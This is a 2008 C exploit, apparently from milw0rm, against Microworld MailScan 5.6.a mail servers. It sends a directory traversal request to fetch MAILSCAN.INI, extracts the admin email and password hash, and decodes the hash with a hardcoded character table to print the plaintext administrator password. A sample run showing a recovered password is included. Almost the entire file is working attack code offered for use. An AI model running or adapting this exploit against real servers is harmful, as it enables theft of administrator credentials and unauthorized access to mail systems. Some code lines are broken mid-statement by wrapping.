/*
----------------------------------------------------------------------------------------------

       _____           ____
      / ___/___  _____/ __ \___ _   __
      \__ \/ _ \/ ___/ / / / _ \ | / /
     ___/ /  __/ /__/ /_/ /  __/ |/ /
    /____/\___/\___/_____/\___/|___/
    [2008]  SecurityDevelopment.net


  Author: SlaYeR
  Date: 25. Aug. 2008
  Email: slayer@securitydevelopment.net
  Website: www.securitydevelopment.net
  IRC: dragon.overfl0w.org #securitydevelopment.net

----------------------------------------------------------------------------------------------

Exploit based on the advisory from Oliver Karow @
http://securityvulns.com/Udocument375.html

- MailScan for Mail Servers

    * Version: 5.6.a with espatch1
    * Win32 Platform

Other Mailscan Products, Versions, also, if available
for other platforms, were not tested.


I used the Directory Traversal methode to access the ini file of mailscan
application to gain some importend data.
After some research i found out that the password algorithm was extreamly
weak. So i decided to code a exploit for it.


15. Aug. 2008 - Advisory release
20. Aug. 2008 - SlaYeR founds out about the advisory
21. Aug. 2008 - Found out about the ini file
22. Aug. 2008 - Found out about the weak algorithm and coded a sploit for it.
25. Aug. 2008 - Private version done.
04. Sep. 2008 - Hotfix released by Microworld.
09. Sep. 2008 - Public release


Some special greets to:
Dams - He helped me with some stupid errors inside the decode_hash function
JGS - He helped me with the spliting hash part
Mikke8 - He didn't helped me but i like hem;)

Team Ph0enix - Cuz they Own

----------------------------------------------------------------------------------------------

Example:

         _____           ____
        / ___/___  _____/ __ \___ _   __
        \__ \/ _ \/ ___/ / / / _ \ | / /
       ___/ /  __/ /__/ /_/ /  __/ |/ /
      /____/\___/\___/_____/\___/|___/
      [2008]  SecurityDevelopment.net

 - Microworld Mailscan 5.6.a password reveal exploit -
               Coded by: SlaYeR


[!] Targeting 192.168.1.111:10443
[!] Building magic string!
[!] Connected to host!
[!] Building request!
[!] Opening target!
[+] SERVER: MailScan 5.6a
[+] ADMIN: insecure-mailscan@securitydevelopment.net
[+] HASH: GJBIAHALBCHIBJGJGGAEBMAFBIGGAGGKAIBJHLBMAEBJDHAPBH
[+] PASS: "sl@y3r"-owns-m!cr0word|\
[+] Done!


----------------------------------------------------------------------------------------------

*/




#include <stdio.h>
#include <windows.h>
#include <wininet.h>



#pragma comment(lib, "wininet")
#pragma comment(lib,"ws2_32")

char *SECDEV_ASCII=
"         _____           ____           \n"
"        / ___/___  _____/ __ \\___ _   __\n"
"        \\__ \\/ _ \\/ ___/ / / / _ \\ | / /\n"
"       ___/ /  __/ /__/ /_/ /  __/ |/ / \n"
"      /____/\\___/\\___/_____/\\___/|___/  \n"
"      [2008]  SecurityDevelopment.net\r\n"
"\r\n"
" - Microworld Mailscan 5.6.a password reveal exploit -\r\n"
"               Coded by: SlaYeR\r\n"
"                          \r\n\r\n";


int decode_hash(char * string);
int Count;
int exploit(char *url,char *port);



int main(int argc, char *argv[])
{
 char *url = argv[1];
 char *port = argv[2];
 printf(SECDEV_ASCII);

 if( argc <= 2 )
 {
  printf(" Usage: %s <IP> <PORT>\n",argv[0]);
  return 0;
 }
 else
 {
  exploit(url,port);
 }
 return 0;
}


int exploit(char *url,char *port)
{
 printf("[!] Targeting %s:%s\n",url,port);


 HINTERNET httpopen, openurl;
 char buffer2[1024];
 DWORD read;
 char *check;
 char *string1 = "http://";
 char *string2 = "/../../../../PROGRA~1/MailScan/MAILSCAN.INI";
 char bigbuffer[1025];
 char buffer3[1025];
 char buffer4[1025];
 char buffer5[1025];
 char buffer6[1025];



 if(httpopen = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0))
 {
  printf("[!] Building request!\n");
  memset(bigbuffer,0,1025);
  memcpy(bigbuffer,string1,strlen(string1));
  memcpy(bigbuffer+strlen(bigbuffer),url,strlen(url));
  memcpy(bigbuffer+strlen(bigbuffer),":",strlen(":"));
  memcpy(bigbuffer+strlen(bigbuffer),port,strlen(port));
  memcpy(bigbuffer+strlen(bigbuffer),string2,strlen(string2));
 }
 else
 {
  printf("[-] Error building request!\n");
  InternetCloseHandle(httpopen);
  CloseHandle(buffer2);
  return 0;
 }

 printf("[!] Trying to connect @ %s:%s\n",url,port);
 if(openurl = InternetOpenUrl(httpopen, bigbuffer, NULL, NULL,
INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL))
 {
  printf("[!] Connected to host!\n");
 }
 else
 {
  printf("[-] Error while connecting! \n");
  InternetCloseHandle(httpopen);
  InternetCloseHandle(openurl);
  CloseHandle(buffer2);
  return 0;
 }

 if(InternetReadFile(openurl, buffer2, sizeof(buffer2), &read))
 {

  if(check = strstr(buffer2, "[General]"))
  {

   check = strstr(buffer2, "UserPassword=");
   sscanf(check, "UserPassword=%s ", buffer3);

   check = strstr(buffer2, "AdminEmailId=");
   sscanf(check, "AdminEmailId=%s ", buffer4);

   check = strstr(buffer2, "ProductName=");
   sscanf(check, "ProductName=%s ", buffer5);

   check = strstr(buffer2, "Version=");
   sscanf(check, "Version=%s ", buffer6);
  }




 if( check==NULL )
 {
  printf("[-] Server not vuln :(\n");

 }
 else
 {
  printf("[+] SERVER: %s %s\n",buffer5,buffer6);
  printf("[+] ADMIN: %s\n",buffer4);
  printf("[+] HASH: %s\n",buffer3);
  printf("[+] PASS: ");

  char bufferfiller[sizeof(buffer3)];
  char temp[1025];

  memset(bufferfiller,0,sizeof(buffer3));

  for (int i=0;i < strlen(buffer3); i++)
  {
   Count++;

   sprintf(temp,"%c",buffer3[i]);
   memcpy(bufferfiller+strlen(bufferfiller),temp,strlen(temp));

   if(Count == 2)
   {
    char buf[255];
    memset(buf,0,sizeof(255));
    sprintf(buf,"%s",bufferfiller);

    decode_hash(buf);
    memset(bufferfiller,0,1025);
    Count = 0;
   }
  }
  printf("\n[+] Done!\n");
 }
 }
 else
 {
  printf("[-] Server not vuln :(\n");
 }

 InternetCloseHandle(httpopen);
 InternetCloseHandle(openurl);
 CloseHandle(buffer2);

 return 0;
}


int decode_hash(char * string)
{

 // Yes it token me allot of work to wrote this down... (only default
charset)
 // if you want more just do it by yourself

 if( strcmp( string, "DA" ) == 0 ){printf("{");} if( strcmp( string, "DG"
) == 0 ){printf("}");}
 if( strcmp( string, "BH" ) == 0 ){printf("|");} if( strcmp( string, "HB"
) == 0 ){printf(":");}
 if( strcmp( string, "GJ" ) == 0 ){printf("\"");} if( strcmp( string, "HH"
) == 0 ){printf("<");}
 if( strcmp( string, "HF" ) == 0 ){printf(">");} if( strcmp( string, "HE"
) == 0 ){printf("?");}
 if( strcmp( string, "BA" ) == 0 ){printf("[");} if( strcmp( string, "BG"
) == 0 ){printf("]");}
 if( strcmp( string, "BH" ) == 0 ){printf("\\");} if( strcmp( string, "HA"
) == 0 ){printf(";");}
 if( strcmp( string, "GM" ) == 0 ){printf("'");} if( strcmp( string, "GH"
) == 0 ){printf(",");}
 if( strcmp( string, "GF" ) == 0 ){printf(".");} if( strcmp( string, "GE"
) == 0 ){printf("/");}
 if( strcmp( string, "DF" ) == 0 ){printf("~");} if( strcmp( string, "GK"
) == 0 ){printf("!");}
 if( strcmp( string, "AL" ) == 0 ){printf("@");} if( strcmp( string, "GI"
) == 0 ){printf("#");}
 if( strcmp( string, "GP" ) == 0 ){printf("$");} if( strcmp( string, "GO"
) == 0 ){printf("%");}
 if( strcmp( string, "BF" ) == 0 ){printf("^");} if( strcmp( string, "GN"
) == 0 ){printf("&");}
 if( strcmp( string, "GB" ) == 0 ){printf("*");} if( strcmp( string, "GD"
) == 0 ){printf("(");}
 if( strcmp( string, "BE" ) == 0 ){printf("_");} if( strcmp( string, "GA"
) == 0 ){printf("+");}
 if( strcmp( string, "GG" ) == 0 ){printf("-");} if( strcmp( string, "HG"
) == 0 ){printf("=");}
 if( strcmp( string, "AK" ) == 0 ){printf("a");} if( strcmp( string, "AJ"
) == 0 ){printf("b");}
 if( strcmp( string, "AI" ) == 0 ){printf("c");} if( strcmp( string, "AP"
) == 0 ){printf("d");}
 if( strcmp( string, "AO" ) == 0 ){printf("e");} if( strcmp( string, "AN"
) == 0 ){printf("f");}
 if( strcmp( string, "AM" ) == 0 ){printf("g");} if( strcmp( string, "AD"
) == 0 ){printf("h");}
 if( strcmp( string, "AC" ) == 0 ){printf("i");} if( strcmp( string, "AB"
) == 0 ){printf("j");}
 if( strcmp( string, "AA" ) == 0 ){printf("k");} if( strcmp( string, "AH"
) == 0 ){printf("l");}
 if( strcmp( string, "AG" ) == 0 ){printf("m");} if( strcmp( string, "AF"
) == 0 ){printf("n");}
 if( strcmp( string, "AE" ) == 0 ){printf("o");} if( strcmp( string, "BL"
) == 0 ){printf("p");}
 if( strcmp( string, "BK" ) == 0 ){printf("q");} if( strcmp( string, "BJ"
) == 0 ){printf("r");}
 if( strcmp( string, "BI" ) == 0 ){printf("s");} if( strcmp( string, "BP"
) == 0 ){printf("t");}
 if( strcmp( string, "BO" ) == 0 ){printf("u");} if( strcmp( string, "BN"
) == 0 ){printf("v");}
 if( strcmp( string, "BM" ) == 0 ){printf("w");} if( strcmp( string, "BD"
) == 0 ){printf("x");}
 if( strcmp( string, "BC" ) == 0 ){printf("y");} if( strcmp( string, "BB"
) == 0 ){printf("z");}
 if( strcmp( string, "HK" ) == 0 ){printf("1");} if( strcmp( string, "HJ"
) == 0 ){printf("2");}
 if( strcmp( string, "HI" ) == 0 ){printf("3");} if( strcmp( string, "HP"
) == 0 ){printf("4");}
 if( strcmp( string, "HO" ) == 0 ){printf("5");} if( strcmp( string, "HN"
) == 0 ){printf("6");}
 if( strcmp( string, "HM" ) == 0 ){printf("7");} if( strcmp( string, "HD"
) == 0 ){printf("8");}
 if( strcmp( string, "HC" ) == 0 ){printf("9");} if( strcmp( string, "HL"
) == 0 ){printf("0");}
 if( strcmp( string, "GC" ) == 0 ){printf(")");} if( strcmp( string, "GL"
) == 0 ){printf(" ");}

 return 0;
}

// milw0rm.com [2008-09-09]
